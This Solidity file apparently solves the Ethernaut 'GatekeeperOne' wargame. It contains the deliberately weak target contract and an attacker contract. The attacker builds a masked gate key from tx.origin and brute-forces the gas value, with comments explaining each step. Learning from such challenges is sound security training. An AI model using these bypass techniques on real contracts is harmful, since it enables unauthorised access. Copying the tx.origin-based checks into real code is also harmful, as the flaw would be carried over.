// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    // to pass gate one we have to make sure that the origin and sender is not same

    /**
     *
     * A->B-> GateKeeperOne
     * B is our contract GateKeepeSol
     * A is the wallet (user) which initaite the txn and B will be the sender.
     */

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    /**
     *  gasTwo we need to make sure that when we are excuting the statement we should have gas which is multipe of
     * 8191.
     * In evm each operation has opcode and for each opcode we need some amount of gas.
     * We need to calculate the total gas and check that when we reach the gate two it should the gas we
     * required for that we will use brute force to find the gas which will fulfill this
     */

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    /***
     * To passs gate three we have to satisfy 3 conditions
     * now we have  _gateKey which is bytes 8 = 0X B1 B2 B3 B4 B5 B6 B7 B8
     * uint64() has size of 8 bytes
     * now we have to convert those 8 bytes into uint32 and uint16
     *
     * when we conver a bigger byte to lower bytes some value is lost in translation.
     * Here when convert to uint32(_gateKey) we take the lower most bytes
     * uint32(_gatekey) =  B5 B6 B7 B8 ;
     * uint16(_gateKey) =  0 0 B7 B8;
     *
     * B5 B6 B7 B8 = 0 0 B7 B8;
     *
     * B5 and B6 bit need to be 0 only then they will be equal
     *
     *
     * uint32(uint64(_gateKey)) != uint64(_gateKey)
     * 0 0 0 0 B5  B6 B7 B8 != B1 B2 B3 B4 B5 B6 B7 B8
     * i.e B1 B2 B3 B4  can be anything but 0 else it become same
     *
     *
     *  uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
     *  B5 B6 B7 B8 = 0 0 B7 B8;
     *
     * so our mask will become
     *
     * bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF
     * this will give us bytes8
     *
     */
    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GateKeeperSol {
    GatekeeperOne gatekeeper;

    constructor(address _add) payable {
        gatekeeper = GatekeeperOne(_add);
    }

    function exploit() external {
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) &
            0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(gatekeeper).call{gas: i + (8191 * 3)}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
